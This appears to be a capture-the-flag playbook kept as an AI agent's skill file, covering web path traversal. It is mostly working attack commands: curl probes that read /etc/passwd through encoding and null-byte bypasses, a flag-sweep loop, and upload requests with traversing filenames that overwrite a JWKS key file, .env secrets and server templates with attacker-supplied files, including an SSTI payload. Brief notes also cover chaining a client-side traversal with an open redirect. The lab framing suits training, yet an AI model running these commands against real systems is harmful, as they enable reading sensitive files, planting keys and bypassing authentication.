# Path traversal (read) and upload write-traversal

## E. Read traversal — filename or path params

Start from a URL that already returns a real file. `lfiquick.py` preserves that baseline and all
other query fields, calibrates a same-directory missing-file control, tests a bounded traversal
matrix, and scans response headers as well as bodies. If auth is supplied, it checks the baseline
and winning read anonymously too. A confirmed `/etc/passwd` read causes the exact winning style
and depth to be reused for the flag sweep; differentials without a file signature remain
inconclusive and are retained under `--out` for inspection.

```bash
python3 ~/.codex/skills/web-ctf/scripts/lfiquick.py \
  --url "<target>/api/file?name=/uploads/known.txt" --param name \
  --token "$TOKEN" --out recon/lfiquick
```

Use the manual probes below only when the endpoint cannot be represented as one GET query field,
or to investigate evidence retained by the bounded helper.

```bash
curl -si "<target>/api/file?name=../../../etc/passwd" $AUTH_HEADER              # standard
curl -si "<target>/api/file?name=....//....//....//etc/passwd" $AUTH_HEADER     # four-dot double-slash
curl -si "<target>/api/file?name=..%252f..%252f..%252fetc%252fpasswd" $AUTH_HEADER  # double-encode
curl -si "<target>/api/file?name=../../../etc/passwd%00.txt" $AUTH_HEADER       # null byte
curl -si "<target>/api/file?name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" $AUTH_HEADER  # overlong
```

**The `....//` bypass specifically:** Node treats `....` as a literal directory name, so combined with `//` the resolved path reaches a different location than the regex checked. It also defeats suffix-appending suppressors (`.txt`).

Once traversal works, keep the same prefix, encoding, and depth that won. Do not switch wrappers
for the flag sweep:
```bash
WIN='../../../'  # replace with the exact confirmed prefix
for f in '/flag.txt' '/flag' '/root/flag.txt' '/home/user/flag.txt' '/app/flag.txt' '/data/flag.txt' '/var/flag.txt'; do
  echo "=== $f ==="; curl -si "<target>/api/file?name=${WIN}${f#/}" $AUTH_HEADER
done
```

`/data/` is worth trying early — not just `/` and `/app/`.

## E.2. Upload write-traversal — unsanitized filename

If the app passes the upload filename to a save call (`file.save(UPLOAD_DIR + "/" + filename)`), the filename is a write sink. Overwriting server config/key files is often the fastest escalation.

```bash
# probe: are path separators accepted? 200/302 (not 400/422/500) means it likely landed
curl -si -X POST <target>/api/upload $AUTH_HEADER -F "file=@/dev/null;filename=../canary.txt"

# find the JWKS path
curl -s <target>/static/.well-known/jwks.json && echo "JWKS found"
curl -s <target>/.well-known/jwks.json && echo "JWKS at root"

# depth depends on where UPLOADS_DIR sits relative to the target
#   /app/uploads/ -> /app/static/.well-known/jwks.json  = ../static/.well-known/jwks.json
#   /app/uploads/ -> /static/.well-known/jwks.json      = ../../static/.well-known/jwks.json
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"

curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool   # verify
```

Other high-value overwrite targets:
```bash
# .env — DB creds / secrets read at runtime
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.env;filename=../.env"

# server-side template — overwrite with an SSTI payload
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
```

JWKS overwrite lands → go to `auth-jwt.md` § JWKS substitution.

## Client-side path traversal + open redirect

When a feature builds a URL by appending a **fixed** suffix to user input (plugin manifests, "app studio", widget marketplaces), a `#` fragment truncates everything after it, and a literal backslash can defeat redirect validation. Full chain (Grafana CVE-2025-4123 re-themed) is in the FurHire-013 writeup.

**If a custom-branded feature feels over-engineered relative to the rest of the app, search for the real product it's themed after and look up that product's recent CVEs by name** — BugForge labs do re-implement disclosed CVEs.

This chain depends on **browser** URL parsing (fragment truncation, backslash handling) — curl normalizes differently and won't reproduce it. Drive it in the in-app browser pane and watch where the request actually lands: `browser.md`.
